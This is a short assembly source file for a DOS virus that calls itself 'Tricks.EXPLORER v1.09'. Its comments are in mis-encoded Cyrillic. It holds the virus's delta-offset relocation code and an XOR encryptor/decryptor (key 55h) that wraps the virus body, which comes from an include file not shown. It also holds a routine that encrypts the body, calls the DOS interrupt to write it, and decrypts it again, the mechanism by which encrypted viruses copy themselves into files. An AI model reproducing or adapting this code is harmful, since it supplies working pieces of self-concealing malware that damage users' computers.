;************************************************
;*	Tricks.EXPLORER v1.09                   *
;************************************************
.286
TestS	segment
	assume	cs:TestS,ds:TestS,ss:TestS
	org	100h
;
Shift	= ((Next-Start)+100h)	
CryptLen= CopyRT-Crypted
;
Start:
	call	Next
Next:
	pop	si
	sub	si,Shift
	call	Crypt	
;
Crypted:
;************************************************
	include	trexp.inc ; ����஢���         *
;************************************************
CopyRT	db	0,'[Tricks.EXPLORER] v1.09',0
;
WriV:
	call	Crypt
	int	21h
	call	Crypt
	ret
;************************************************
;*	�����஢騪                            * 
;************************************************
Point:
	pusha
	mov	al, 055h
	lea	bx, Crypted[si]
	mov	cx, CryptLen
Circle:	
	xor	byte ptr [bx], al
	inc	bx
	loop	Circle
	popa
	ret
Crypt:
	mov	ax, offset Point
	add	ax, si
	push	ax
	ret	
;
Finish:
;
Tests	ends
	End	Start
				